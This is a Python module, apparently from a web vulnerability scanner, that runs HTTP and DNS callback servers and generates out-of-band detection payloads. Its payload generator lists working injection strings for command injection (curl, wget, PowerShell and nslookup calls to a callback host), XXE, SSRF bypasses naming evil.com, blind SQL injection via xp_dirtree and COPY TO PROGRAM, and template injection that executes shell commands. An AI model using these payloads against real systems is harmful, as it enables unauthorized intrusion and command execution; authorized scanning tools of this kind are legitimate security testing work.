"""
Out-of-Band (OOB) Callback Service

Provides built-in HTTP and DNS callback servers for detecting blind vulnerabilities
like SSRF, XXE, RCE, and blind SQLi that require out-of-band data exfiltration.

Features:
- Unique callback token generation per test
- HTTP callback server with payload correlation
- DNS callback server (via subdomain tracking)
- Callback event storage and retrieval
- Time-based correlation with original requests
- Support for various data exfiltration methods
"""

import asyncio
import hashlib
import json
import logging
import secrets
import socket
import struct
import time
import uuid
from dataclasses import dataclass, field
from datetime import datetime, timedelta
from enum import Enum
from typing import Any, Callable, Dict, List, Optional, Set, Tuple, Union
from urllib.parse import parse_qs, urlparse
import threading
from collections import defaultdict

from fastapi import Request
from starlette.responses import Response

logger = logging.getLogger(__name__)


class CallbackType(str, Enum):
    """Type of callback received."""
    HTTP_GET = "http_get"
    HTTP_POST = "http_post"
    HTTP_OPTIONS = "http_options"
    HTTP_HEAD = "http_head"
    DNS_A = "dns_a"
    DNS_TXT = "dns_txt"
    DNS_CNAME = "dns_cname"
    DNS_MX = "dns_mx"


class VulnerabilityType(str, Enum):
    """Type of vulnerability indicated by callback."""
    SSRF = "ssrf"
    XXE = "xxe"
    RCE = "rce"
    BLIND_SQLI = "blind_sqli"
    BLIND_XSS = "blind_xss"
    SSTI = "ssti"
    LFI = "lfi"
    UNKNOWN = "unknown"


@dataclass
class CallbackToken:
    """Represents a unique callback token for tracking."""
    token: str
    created_at: datetime
    expires_at: datetime
    scan_id: str
    endpoint: str
    parameter: str
    payload_type: VulnerabilityType
    payload: str
    metadata: Dict[str, Any] = field(default_factory=dict)
    
    def is_expired(self) -> bool:
        return datetime.utcnow() > self.expires_at
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            "token": self.token,
            "created_at": self.created_at.isoformat(),
            "expires_at": self.expires_at.isoformat(),
            "scan_id": self.scan_id,
            "endpoint": self.endpoint,
            "parameter": self.parameter,
            "payload_type": self.payload_type.value,
            "payload": self.payload,
            "metadata": self.metadata,
        }


@dataclass
class CallbackEvent:
    """Represents a received callback event."""
    id: str = field(default_factory=lambda: uuid.uuid4().hex[:16])
    token: str = ""
    callback_type: CallbackType = CallbackType.HTTP_GET
    timestamp: datetime = field(default_factory=datetime.utcnow)
    source_ip: str = ""
    source_port: int = 0
    headers: Dict[str, str] = field(default_factory=dict)
    body: str = ""
    query_params: Dict[str, str] = field(default_factory=dict)
    dns_query: str = ""
    user_agent: str = ""
    
    # Correlation with original request
    correlated_scan_id: Optional[str] = None
    correlated_endpoint: Optional[str] = None
    correlated_parameter: Optional[str] = None
    correlated_payload_type: Optional[VulnerabilityType] = None
    correlated_payload: Optional[str] = None
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            "id": self.id,
            "token": self.token,
            "callback_type": self.callback_type.value,
            "timestamp": self.timestamp.isoformat(),
            "source_ip": self.source_ip,
            "source_port": self.source_port,
            "headers": self.headers,
            "body": self.body,
            "query_params": self.query_params,
            "dns_query": self.dns_query,
            "user_agent": self.user_agent,
            "correlation": {
                "scan_id": self.correlated_scan_id,
                "endpoint": self.correlated_endpoint,
                "parameter": self.correlated_parameter,
                "payload_type": self.correlated_payload_type.value if self.correlated_payload_type else None,
                "payload": self.correlated_payload,
            }
        }


class OOBCallbackStore:
    """
    In-memory store for callback tokens and events.
    In production, use Redis or a database for persistence.
    """
    
    def __init__(self, max_tokens: int = 100000, max_events: int = 50000):
        self._tokens: Dict[str, CallbackToken] = {}
        self._events: List[CallbackEvent] = []
        self._events_by_token: Dict[str, List[CallbackEvent]] = defaultdict(list)
        self._events_by_scan: Dict[str, List[CallbackEvent]] = defaultdict(list)
        self._max_tokens = max_tokens
        self._max_events = max_events
        self._lock = threading.RLock()
    
    def register_token(self, token: CallbackToken) -> None:
        """Register a new callback token."""
        with self._lock:
            # Cleanup expired tokens if at capacity
            if len(self._tokens) >= self._max_tokens:
                self._cleanup_expired_tokens()
            
            self._tokens[token.token] = token
    
    def get_token(self, token_str: str) -> Optional[CallbackToken]:
        """Get a token by its string value."""
        with self._lock:
            token = self._tokens.get(token_str)
            if token and token.is_expired():
                del self._tokens[token_str]
                return None
            return token
    
    def record_event(self, event: CallbackEvent) -> None:
        """Record a callback event."""
        with self._lock:
            # Maintain max events
            if len(self._events) >= self._max_events:
                self._events = self._events[-self._max_events // 2:]
            
            self._events.append(event)
            
            if event.token:
                self._events_by_token[event.token].append(event)
            
            if event.correlated_scan_id:
                self._events_by_scan[event.correlated_scan_id].append(event)
    
    def get_events_by_token(self, token: str) -> List[CallbackEvent]:
        """Get all events for a specific token."""
        with self._lock:
            return list(self._events_by_token.get(token, []))
    
    def get_events_by_scan(self, scan_id: str) -> List[CallbackEvent]:
        """Get all events for a specific scan."""
        with self._lock:
            return list(self._events_by_scan.get(scan_id, []))
    
    def get_recent_events(self, limit: int = 100) -> List[CallbackEvent]:
        """Get most recent callback events."""
        with self._lock:
            return list(reversed(self._events[-limit:]))
    
    def has_callback_for_token(self, token: str) -> bool:
        """Check if any callback was received for a token."""
        with self._lock:
            return len(self._events_by_token.get(token, [])) > 0
    
    def _cleanup_expired_tokens(self) -> None:
        """Remove expired tokens."""
        now = datetime.utcnow()
        expired = [k for k, v in self._tokens.items() if v.expires_at < now]
        for k in expired:
            del self._tokens[k]
    
    def get_stats(self) -> Dict[str, Any]:
        """Get store statistics."""
        with self._lock:
            return {
                "total_tokens": len(self._tokens),
                "total_events": len(self._events),
                "unique_scans_with_callbacks": len(self._events_by_scan),
                "max_tokens": self._max_tokens,
                "max_events": self._max_events,
            }


# Global callback store
_callback_store = OOBCallbackStore()


class OOBCallbackManager:
    """
    Manager for out-of-band callback operations.
    Handles token generation, callback URL creation, and event processing.
    """
    
    def __init__(
        self,
        callback_domain: str = "localhost",
        callback_port: int = 8080,
        callback_protocol: str = "http",
        token_expiry_hours: int = 24,
        store: Optional[OOBCallbackStore] = None,
    ):
        self.callback_domain = callback_domain
        self.callback_port = callback_port
        self.callback_protocol = callback_protocol
        self.token_expiry_hours = token_expiry_hours
        self.store = store or _callback_store
    
    def generate_token(
        self,
        scan_id: str,
        endpoint: str,
        parameter: str,
        payload_type: VulnerabilityType,
        payload: str,
        metadata: Optional[Dict[str, Any]] = None,
    ) -> CallbackToken:
        """Generate a unique callback token."""
        # Create a unique, URL-safe token
        token_str = secrets.token_urlsafe(16)
        
        now = datetime.utcnow()
        token = CallbackToken(
            token=token_str,
            created_at=now,
            expires_at=now + timedelta(hours=self.token_expiry_hours),
            scan_id=scan_id,
            endpoint=endpoint,
            parameter=parameter,
            payload_type=payload_type,
            payload=payload,
            metadata=metadata or {},
        )
        
        self.store.register_token(token)
        return token
    
    def get_callback_url(self, token: CallbackToken, path_style: str = "path") -> str:
        """
        Generate a callback URL for the token.
        
        path_style options:
        - "path": http://domain:port/callback/{token}
        - "subdomain": http://{token}.domain:port/callback
        - "query": http://domain:port/callback?token={token}
        """
        if path_style == "subdomain":
            return f"{self.callback_protocol}://{token.token}.{self.callback_domain}:{self.callback_port}/callback"
        elif path_style == "query":
            return f"{self.callback_protocol}://{self.callback_domain}:{self.callback_port}/callback?token={token.token}"
        else:  # path style (default)
            return f"{self.callback_protocol}://{self.callback_domain}:{self.callback_port}/callback/{token.token}"
    
    def get_dns_callback_domain(self, token: CallbackToken) -> str:
        """Get a DNS callback domain for the token."""
        return f"{token.token}.{self.callback_domain}"
    
    def generate_payload_with_callback(
        self,
        payload_template: str,
        scan_id: str,
        endpoint: str,
        parameter: str,
        payload_type: VulnerabilityType,
    ) -> Tuple[str, CallbackToken]:
        """
        Generate a payload with embedded callback URL.
        
        Template placeholders:
        - {{CALLBACK_URL}} - Full callback URL
        - {{CALLBACK_HOST}} - Callback host
        - {{CALLBACK_TOKEN}} - Just the token
        - {{DNS_CALLBACK}} - DNS callback domain
        """
        token = self.generate_token(
            scan_id=scan_id,
            endpoint=endpoint,
            parameter=parameter,
            payload_type=payload_type,
            payload=payload_template,
        )
        
        callback_url = self.get_callback_url(token)
        dns_domain = self.get_dns_callback_domain(token)
        callback_host = f"{self.callback_domain}:{self.callback_port}"
        
        payload = payload_template.replace("{{CALLBACK_URL}}", callback_url)
        payload = payload.replace("{{CALLBACK_HOST}}", callback_host)
        payload = payload.replace("{{CALLBACK_TOKEN}}", token.token)
        payload = payload.replace("{{DNS_CALLBACK}}", dns_domain)
        
        return payload, token
    
    async def process_http_callback(
        self,
        request: Request,
        token_str: Optional[str] = None,
    ) -> CallbackEvent:
        """Process an incoming HTTP callback."""
        # Extract token from various sources
        if not token_str:
            # Try path
            path_parts = request.url.path.strip("/").split("/")
            if len(path_parts) >= 2 and path_parts[0] == "callback":
                token_str = path_parts[1]
            # Try query params
            if not token_str:
                token_str = request.query_params.get("token", "")
            # Try subdomain
            if not token_str:
                host = request.headers.get("host", "")
                if "." in host:
                    subdomain = host.split(".")[0]
                    if self.store.get_token(subdomain):
                        token_str = subdomain
        
        # Get client info
        source_ip = request.client.host if request.client else "unknown"
        source_port = request.client.port if request.client else 0
        
        # Determine callback type
        method = request.method.upper()
        callback_type_map = {
            "GET": CallbackType.HTTP_GET,
            "POST": CallbackType.HTTP_POST,
            "OPTIONS": CallbackType.HTTP_OPTIONS,
            "HEAD": CallbackType.HTTP_HEAD,
        }
        callback_type = callback_type_map.get(method, CallbackType.HTTP_GET)
        
        # Read body
        try:
            body = (await request.body()).decode("utf-8", errors="replace")
        except Exception:
            body = ""
        
        # Create event
        event = CallbackEvent(
            token=token_str or "",
            callback_type=callback_type,
            source_ip=source_ip,
            source_port=source_port,
            headers={k: v for k, v in request.headers.items()},
            body=body,
            query_params=dict(request.query_params),
            user_agent=request.headers.get("user-agent", ""),
        )
        
        # Correlate with token
        if token_str:
            token = self.store.get_token(token_str)
            if token:
                event.correlated_scan_id = token.scan_id
                event.correlated_endpoint = token.endpoint
                event.correlated_parameter = token.parameter
                event.correlated_payload_type = token.payload_type
                event.correlated_payload = token.payload
        
        # Store event
        self.store.record_event(event)
        
        return event
    
    def check_callbacks(self, scan_id: str) -> List[CallbackEvent]:
        """Check for any callbacks received for a scan."""
        return self.store.get_events_by_scan(scan_id)
    
    def has_callback(self, token: str) -> bool:
        """Check if a callback was received for a specific token."""
        return self.store.has_callback_for_token(token)


# =============================================================================
# OOB PAYLOAD TEMPLATES
# =============================================================================

class OOBPayloadGenerator:
    """Generates OOB payloads for various vulnerability types."""
    
    def __init__(self, callback_manager: OOBCallbackManager):
        self.callback_manager = callback_manager
    
    def get_ssrf_payloads(
        self,
        scan_id: str,
        endpoint: str,
        parameter: str,
    ) -> List[Tuple[str, CallbackToken]]:
        """Generate SSRF detection payloads."""
        templates = [
            # Basic URL
            "{{CALLBACK_URL}}",
            "http://{{CALLBACK_HOST}}/{{CALLBACK_TOKEN}}",
            # Bypass techniques
            "http://{{CALLBACK_HOST}}@evil.com/{{CALLBACK_TOKEN}}",
            "http://evil.com#@{{CALLBACK_HOST}}/{{CALLBACK_TOKEN}}",
            "http://{{CALLBACK_HOST}}%23@evil.com/{{CALLBACK_TOKEN}}",
            # Protocol variations
            "//{{CALLBACK_HOST}}/{{CALLBACK_TOKEN}}",
            "https://{{CALLBACK_HOST}}/{{CALLBACK_TOKEN}}",
            # URL encoding
            "http://%5B::ffff:{{CALLBACK_HOST}}%5D/{{CALLBACK_TOKEN}}",
            # DNS rebinding style
            "http://{{DNS_CALLBACK}}",
            # Gopher (if supported)
            "gopher://{{CALLBACK_HOST}}:80/_GET /{{CALLBACK_TOKEN}} HTTP/1.1%0d%0aHost: {{CALLBACK_HOST}}%0d%0a",
        ]
        
        payloads = []
        for template in templates:
            payload, token = self.callback_manager.generate_payload_with_callback(
                template, scan_id, endpoint, parameter, VulnerabilityType.SSRF
            )
            payloads.append((payload, token))
        
        return payloads
    
    def get_xxe_payloads(
        self,
        scan_id: str,
        endpoint: str,
        parameter: str,
    ) -> List[Tuple[str, CallbackToken]]:
        """Generate XXE detection payloads."""
        templates = [
            # Basic external entity
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "{{CALLBACK_URL}}">]><foo>&xxe;</foo>',
            # Parameter entity
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "{{CALLBACK_URL}}"> %xxe;]><foo>test</foo>',
            # With data exfil
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "{{CALLBACK_URL}}?data=test">]><foo>&xxe;</foo>',
            # XInclude
            '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="{{CALLBACK_URL}}"/></foo>',
            # SSRF via XXE
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{{CALLBACK_HOST}}/{{CALLBACK_TOKEN}}">]><foo>&xxe;</foo>',
            # DNS exfil
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{{DNS_CALLBACK}}/test">]><foo>&xxe;</foo>',
        ]
        
        payloads = []
        for template in templates:
            payload, token = self.callback_manager.generate_payload_with_callback(
                template, scan_id, endpoint, parameter, VulnerabilityType.XXE
            )
            payloads.append((payload, token))
        
        return payloads
    
    def get_rce_payloads(
        self,
        scan_id: str,
        endpoint: str,
        parameter: str,
    ) -> List[Tuple[str, CallbackToken]]:
        """Generate RCE detection payloads using OOB."""
        templates = [
            # curl/wget
            "; curl {{CALLBACK_URL}}",
            "| curl {{CALLBACK_URL}}",
            "$(curl {{CALLBACK_URL}})",
            "`curl {{CALLBACK_URL}}`",
            "; wget {{CALLBACK_URL}}",
            "| wget {{CALLBACK_URL}}",
            # nslookup/dig for DNS
            "; nslookup {{DNS_CALLBACK}}",
            "| nslookup {{DNS_CALLBACK}}",
            "$(nslookup {{DNS_CALLBACK}})",
            "; dig {{DNS_CALLBACK}}",
            "| dig {{DNS_CALLBACK}}",
            # PowerShell
            "; powershell -c (New-Object Net.WebClient).DownloadString('{{CALLBACK_URL}}')",
            "| powershell -c iwr {{CALLBACK_URL}}",
            # Python
            "; python -c \"import urllib.request; urllib.request.urlopen('{{CALLBACK_URL}}')\"",
            # PHP
            "<?php file_get_contents('{{CALLBACK_URL}}'); ?>",
            # Perl
            "; perl -e 'use LWP::Simple; get(\"{{CALLBACK_URL}}\")'",
            # Ruby
            "; ruby -e 'require \"net/http\"; Net::HTTP.get(URI(\"{{CALLBACK_URL}}\"))'",
        ]
        
        payloads = []
        for template in templates:
            payload, token = self.callback_manager.generate_payload_with_callback(
                template, scan_id, endpoint, parameter, VulnerabilityType.RCE
            )
            payloads.append((payload, token))
        
        return payloads
    
    def get_blind_sqli_payloads(
        self,
        scan_id: str,
        endpoint: str,
        parameter: str,
    ) -> List[Tuple[str, CallbackToken]]:
        """Generate blind SQLi OOB payloads."""
        templates = [
            # MySQL
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) AND LOAD_FILE(CONCAT('\\\\\\\\',{{DNS_CALLBACK}},'\\\\a'))-- -",
            # PostgreSQL
            "'; COPY (SELECT '') TO PROGRAM 'curl {{CALLBACK_URL}}'-- -",
            # MSSQL
            "'; EXEC master..xp_dirtree '\\\\{{DNS_CALLBACK}}\\a'-- -",
            "'; EXEC master..xp_fileexist '\\\\{{DNS_CALLBACK}}\\a'-- -",
            # Oracle
            "' AND UTL_HTTP.REQUEST('{{CALLBACK_URL}}')='1'-- -",
            "' AND DBMS_LDAP.INIT(('{{DNS_CALLBACK}}',80) IS NOT NULL-- -",
        ]
        
        payloads = []
        for template in templates:
            payload, token = self.callback_manager.generate_payload_with_callback(
                template, scan_id, endpoint, parameter, VulnerabilityType.BLIND_SQLI
            )
            payloads.append((payload, token))
        
        return payloads
    
    def get_ssti_payloads(
        self,
        scan_id: str,
        endpoint: str,
        parameter: str,
    ) -> List[Tuple[str, CallbackToken]]:
        """Generate SSTI OOB detection payloads."""
        templates = [
            # Jinja2/Python
            "{{'{%import os%}{{os.popen(\"curl {{CALLBACK_URL}}\").read()}}'}}",
            "{{'{%import subprocess%}{{subprocess.check_output([\"curl\",\"{{CALLBACK_URL}}\"])}}'}}",
            # Freemarker
            "${\"freemarker.template.utility.Execute\"?new()(\"curl {{CALLBACK_URL}}\")}",
            # Velocity
            "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('curl {{CALLBACK_URL}}'))",
            # Twig
            "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('curl {{CALLBACK_URL}}')}}",
            # Smarty
            "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,'<?php passthru(\"curl {{CALLBACK_URL}}\");',self::clearConfig())}",
        ]
        
        payloads = []
        for template in templates:
            payload, token = self.callback_manager.generate_payload_with_callback(
                template, scan_id, endpoint, parameter, VulnerabilityType.SSTI
            )
            payloads.append((payload, token))
        
        return payloads
    
    def get_lfi_payloads(
        self,
        scan_id: str,
        endpoint: str,
        parameter: str,
    ) -> List[Tuple[str, CallbackToken]]:
        """Generate LFI with OOB payloads (PHP wrappers, etc.)."""
        templates = [
            # PHP expect wrapper
            "expect://curl {{CALLBACK_URL}}",
            # PHP data wrapper with shell
            "data://text/plain;base64,PD9waHAgZmlsZV9nZXRfY29udGVudHMoJ3t7Q0FMTEJBQ0tfVVJMfX0nKTs/Pg==",
            # PHP filter with error
            "php://filter/convert.base64-encode/resource=http://{{CALLBACK_HOST}}/{{CALLBACK_TOKEN}}",
        ]
        
        payloads = []
        for template in templates:
            payload, token = self.callback_manager.generate_payload_with_callback(
                template, scan_id, endpoint, parameter, VulnerabilityType.LFI
            )
            payloads.append((payload, token))
        
        return payloads
    
    def get_all_payloads(
        self,
        scan_id: str,
        endpoint: str,
        parameter: str,
    ) -> Dict[VulnerabilityType, List[Tuple[str, CallbackToken]]]:
        """Get all OOB payloads organized by vulnerability type."""
        return {
            VulnerabilityType.SSRF: self.get_ssrf_payloads(scan_id, endpoint, parameter),
            VulnerabilityType.XXE: self.get_xxe_payloads(scan_id, endpoint, parameter),
            VulnerabilityType.RCE: self.get_rce_payloads(scan_id, endpoint, parameter),
            VulnerabilityType.BLIND_SQLI: self.get_blind_sqli_payloads(scan_id, endpoint, parameter),
            VulnerabilityType.SSTI: self.get_ssti_payloads(scan_id, endpoint, parameter),
            VulnerabilityType.LFI: self.get_lfi_payloads(scan_id, endpoint, parameter),
        }


# =============================================================================
# DNS CALLBACK SERVER (Optional - Simple Implementation)
# =============================================================================

class SimpleDNSServer:
    """
    Simple DNS server for OOB callback detection.
    Listens for DNS queries and records them.
    
    Note: This is a basic implementation. For production,
    consider using a proper DNS server or cloud DNS service.
    """
    
    def __init__(
        self,
        callback_store: OOBCallbackStore,
        listen_ip: str = "0.0.0.0",
        listen_port: int = 5353,
        domain: str = "callback.local",
        response_ip: str = "127.0.0.1",
    ):
        self.store = callback_store
        self.listen_ip = listen_ip
        self.listen_port = listen_port
        self.domain = domain
        self.response_ip = response_ip
        self._server_socket: Optional[socket.socket] = None
        self._running = False
        self._thread: Optional[threading.Thread] = None
    
    def start(self):
        """Start the DNS server in a background thread."""
        if self._running:
            return
        
        self._running = True
        self._thread = threading.Thread(target=self._run_server, daemon=True)
        self._thread.start()
        logger.info(f"DNS callback server started on {self.listen_ip}:{self.listen_port}")
    
    def stop(self):
        """Stop the DNS server."""
        self._running = False
        if self._server_socket:
            self._server_socket.close()
        if self._thread:
            self._thread.join(timeout=2)
        logger.info("DNS callback server stopped")
    
    def _run_server(self):
        """Run the DNS server loop."""
        try:
            self._server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            self._server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self._server_socket.bind((self.listen_ip, self.listen_port))
            self._server_socket.settimeout(1.0)
            
            while self._running:
                try:
                    data, addr = self._server_socket.recvfrom(512)
                    self._handle_dns_query(data, addr)
                except socket.timeout:
                    continue
                except Exception as e:
                    if self._running:
                        logger.error(f"DNS server error: {e}")
        except Exception as e:
            logger.error(f"Failed to start DNS server: {e}")
        finally:
            if self._server_socket:
                self._server_socket.close()
    
    def _handle_dns_query(self, data: bytes, addr: Tuple[str, int]):
        """Handle an incoming DNS query."""
        try:
            # Parse DNS header
            if len(data) < 12:
                return
            
            transaction_id = data[:2]
            flags = struct.unpack(">H", data[2:4])[0]
            
            # Parse question section
            question_start = 12
            domain_parts = []
            pos = question_start
            
            while pos < len(data):
                length = data[pos]
                if length == 0:
                    pos += 1
                    break
                pos += 1
                domain_parts.append(data[pos:pos+length].decode("utf-8", errors="replace"))
                pos += length
            
            queried_domain = ".".join(domain_parts)
            
            # Extract token from subdomain
            token = ""
            if self.domain in queried_domain:
                subdomain = queried_domain.replace(f".{self.domain}", "")
                if subdomain and subdomain != queried_domain:
                    token = subdomain.split(".")[0]
            
            # Record the callback event
            event = CallbackEvent(
                token=token,
                callback_type=CallbackType.DNS_A,
                source_ip=addr[0],
                source_port=addr[1],
                dns_query=queried_domain,
            )
            
            # Correlate if we have a token
            if token:
                registered_token = self.store.get_token(token)
                if registered_token:
                    event.correlated_scan_id = registered_token.scan_id
                    event.correlated_endpoint = registered_token.endpoint
                    event.correlated_parameter = registered_token.parameter
                    event.correlated_payload_type = registered_token.payload_type
                    event.correlated_payload = registered_token.payload
            
            self.store.record_event(event)
            logger.info(f"DNS callback received: {queried_domain} from {addr[0]}")
            
            # Send response
            self._send_dns_response(transaction_id, queried_domain, addr)
            
        except Exception as e:
            logger.error(f"Error handling DNS query: {e}")
    
    def _send_dns_response(self, transaction_id: bytes, domain: str, addr: Tuple[str, int]):
        """Send a DNS response."""
        # Build response
        response = bytearray()
        
        # Transaction ID
        response.extend(transaction_id)
        
        # Flags: Standard response, no error
        response.extend(struct.pack(">H", 0x8180))
        
        # Questions: 1, Answers: 1, Authority: 0, Additional: 0
        response.extend(struct.pack(">HHHH", 1, 1, 0, 0))
        
        # Question section (echo back)
        for part in domain.split("."):
            response.append(len(part))
            response.extend(part.encode())
        response.append(0)
        response.extend(struct.pack(">HH", 1, 1))  # Type A, Class IN
        
        # Answer section
        response.extend(b'\xc0\x0c')  # Pointer to domain name
        response.extend(struct.pack(">HHIH", 1, 1, 60, 4))  # Type A, Class IN, TTL 60, Length 4
        response.extend(socket.inet_aton(self.response_ip))
        
        self._server_socket.sendto(bytes(response), addr)


# =============================================================================
# GLOBAL INSTANCES
# =============================================================================

def get_callback_store() -> OOBCallbackStore:
    """Get the global callback store."""
    return _callback_store


def create_callback_manager(
    domain: str = "localhost",
    port: int = 8080,
    protocol: str = "http",
) -> OOBCallbackManager:
    """Create a callback manager with the global store."""
    return OOBCallbackManager(
        callback_domain=domain,
        callback_port=port,
        callback_protocol=protocol,
        store=_callback_store,
    )


def create_payload_generator(callback_manager: OOBCallbackManager) -> OOBPayloadGenerator:
    """Create a payload generator."""
    return OOBPayloadGenerator(callback_manager)
